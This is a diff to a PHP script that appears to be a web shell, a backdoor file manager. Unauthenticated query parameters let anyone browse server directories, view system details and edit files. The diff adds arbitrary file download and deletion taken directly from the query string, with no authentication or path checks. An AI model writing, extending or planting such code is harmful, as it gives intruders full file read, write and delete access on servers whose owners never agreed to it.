@@ -21,6 +21,16 @@
 			window.location.search = searchParams.toString()
 
 		}
+
+		function deleteFile(nama, value){
+
+			if (confirm("Yakin Delete!") == true) {
+				addUrlParameter(nama,value);
+			} else {
+				console.log('cancel');
+			}
+
+		}
 	</script>
 
 
@@ -78,6 +88,29 @@
 	function OS() {
 		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
 	}
+
+	if (isset($_GET['act'])) {
+		if ($_GET['act']=="download") {
+			
+
+			$file_path = $_GET['dir'].$_GET['f'];
+			$filename = $_GET['f'];
+			header("Content-Type: application/octet-stream");
+			header("Content-Transfer-Encoding: Binary");
+			header("Content-disposition: attachment; filename=\"".$filename."\""); 
+			echo readfile($file_path);
+		}elseif ($_GET['act']=="delete") {
+			$file_path = $_GET['dir'].$_GET['f'];
+			if(file_exists($file_path)) {
+
+				echo "<script>alert('Berhasil Delete')</script>";
+				unlink($file_path);
+			} 
+		}
+	}
+
+	
+
 	echo "<br>";
 	echo "OS : ".OS();
 	echo ' <b>('.php_uname().')</b>';
@@ -121,13 +154,13 @@
 	foreach ($variable as $key => $value) {
 
 		if (is_dir($value)) {
-			echo '<li class="list-group-item" ><a href="?dir=' .path().'/'.$value."/".'"><i class="fas fa-folder-close"></i>'.$value.'</a>';
+			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a href="?dir=' .path().'/'.$value."/".'"><i class="fas fa-folder-close"></i>'.$value.'</a></li>';
 		}
 	}
 
 	foreach ($variable as $key => $value) {
 		if (!is_dir($value)) {
-			echo '<li class="list-group-item" ><a onclick="addUrlParameter('."'f','" .$value."'".')"><i class="fas fa-file-alt"></i>'.$value.'</a>';
+			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a style="cursor: pointer;" onclick="addUrlParameter('."'f','" .$value."'".')"><i class="fas fa-file-alt"></i>'.$value.'</a></li>';
 		}
 	}
 
@@ -151,8 +184,11 @@
 		echo '<textarea name="code" class="form-control" rows="20">'.htmlspecialchars(fread($myfile,filesize($_GET['dir'].$_GET['f']))).'</textarea>';
 		fclose($myfile);
 		
-		echo '<input type="submit" class="btn btn-primary" name="" />
-		</form></div>';
+		echo '<div class="col-sm-4"><input type="submit" class="btn btn-primary" name="" value="Edit"/></div>
+		</form> 
+		<div class="col-sm-4"><button class="btn btn-success" onclick="addUrlParameter('."'act','download'".')">Download</button>
+		<button class="btn btn-danger" onclick="deleteFile('."'act','delete'".');">delete</button></div>
+		</div>';
 	}
 
 	?>
